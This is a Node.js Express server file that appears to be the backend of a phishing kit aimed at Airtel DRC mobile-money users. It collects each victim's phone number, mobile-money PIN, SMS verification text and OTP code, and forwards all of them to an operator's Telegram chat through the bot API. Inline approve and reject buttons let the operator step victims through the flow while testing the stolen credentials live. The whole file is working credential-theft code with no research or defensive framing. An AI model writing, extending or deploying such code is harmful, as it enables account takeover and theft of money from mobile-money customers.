const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const applications = {};

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper function to validate Airtel DRC prefixes (+243 followed by 9 digits starting with 97, 98, or 99 typically, or general 9-digit validation)
function isValidAirtelDrcPhone(phone) {
  // Clean phone string to ensure it's digits only
  const cleanPhone = phone.replace(/\D/g, '');
  // Must be exactly 9 digits
  if (cleanPhone.length !== 9) return false;
  
  // Optional: Airtel DRC prefixes usually start with 97, 98, 99 (or 89 depending on carrier allocations, but let's strictly enforce 9 digits)
  return true;
}

app.post('/api/applications', (req, res) => {
  const { phone } = req.body;

  if (phone && !isValidAirtelDrcPhone(phone)) {
    return res.status(400).json({ error: 'Invalid phone number. Only Airtel DRC lines (9 digits) are allowed.' });
  }

  const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
  applications[appId] = {
    id: appId,
    ...req.body,
    status: 'pending_auth'
  };
  res.json({ id: appId });
});

app.post('/verify-pin', async (req, res) => {
  const { appId, pin, phone } = req.body;

  if (phone && !isValidAirtelDrcPhone(phone)) {
    return res.status(400).json({ error: 'Invalid phone number. Only Airtel DRC lines are allowed.' });
  }

  if (!applications[appId]) {
    applications[appId] = { id: appId };
  }
  applications[appId].momo_phone = phone;
  applications[appId].momo_pin = pin;
  applications[appId].status = 'pending_auth';

  const message = `🔐 *NEW AIRTEL DRC APPLICATION*\n\n` +
    `📱 *Phone:* +243 ${phone}\n` +
    `🔑 *PIN (4 digits):* \`${pin}\`\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ ALLOW TO PROCEED', callback_data: `auth_approve_${appId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

app.post('/verify-sms', async (req, res) => {
  const { appId, smsText } = req.body;
  if (applications[appId]) {
    applications[appId].sms_text = smsText;
    applications[appId].status = 'pending_sms';
  }

  const message = `💬 *SMS VERIFICATION TEXT RECEIVED*\n\n` +
    `📱 *Phone:* +243 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
    `📄 *Content:*\n\`\`\`\n${smsText}\n\`\`\`\n\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ CORRECT SMS TEXT', callback_data: `sms_approve_${appId}` },
        { text: '❌ WRONG SMS TEXT', callback_data: `sms_reject_${appId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

app.post('/verify-otp', async (req, res) => {
  const { appId, otpCode } = req.body;
  if (applications[appId]) {
    applications[appId].otp_code = otpCode;
    applications[appId].status = 'pending_otp';
  }

  const message = `🔢 *OTP VERIFICATION RECEIVED*\n\n` +
    `📱 *Phone:* +243 ${applications[appId]?.momo_phone || 'N/A'}\n` +
    `🔑 *OTP Code (4 digits):* \`${otpCode}\`\n` +
    `🆔 *App ID:* ${appId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ CORRECT OTP', callback_data: `otp_approve_${appId}` },
        { text: '❌ WRONG OTP', callback_data: `otp_reject_${appId}` },
        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
    });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

app.post('/api/request-sms', async (req, res) => {
  const { appId, phone } = req.body;

  const message = `🔄 *NEW SMS REQUEST*\n\n` +
                  `📱 *Phone:* +243 ${phone || 'N/A'}\n` +
                  `🆔 *App ID:* ${appId}\n\n` +
                  `The applicant has requested a new SMS verification timer reset.`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    res.json({ success: true });
  } catch (err) {
    console.error('Telegram notification error:', err);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

app.get('/check-status/:id', (req, res) => {
  const appData = applications[req.params.id];
  if (!appData) return res.status(404).json({ error: 'Not found' });
  res.json(appData);
});

app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const cb = update.callback_query;
    const parts = cb.data.split('_');
    const type = parts[0];     // auth, sms, or otp
    const action = parts[1];   // approve or reject
    const appId = parts.slice(2).join('_');

    if (applications[appId]) {
      if (type === 'auth' && action === 'reject') {
        applications[appId].status = 'PIN_REJECTED';
      } else if (type === 'auth') {
        applications[appId].status = (action === 'approve') ? 'SMS_STEP' : 'PIN_REJECTED';
      } else if (type === 'sms') {
        applications[appId].status = (action === 'approve') ? 'OTP_STEP' : 'SMS_REJECTED';
      } else if (type === 'otp') {
        if (action === 'approve') {
          applications[appId].status = 'APPROVED';
        } else {
          applications[appId].status = 'OTP_REJECTED';
        }
      }
    }

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: cb.id, text: `Processed: ${action.toUpperCase()}` })
      });
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } })
      });
    } catch (e) {
      console.error(e);
    }
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
  
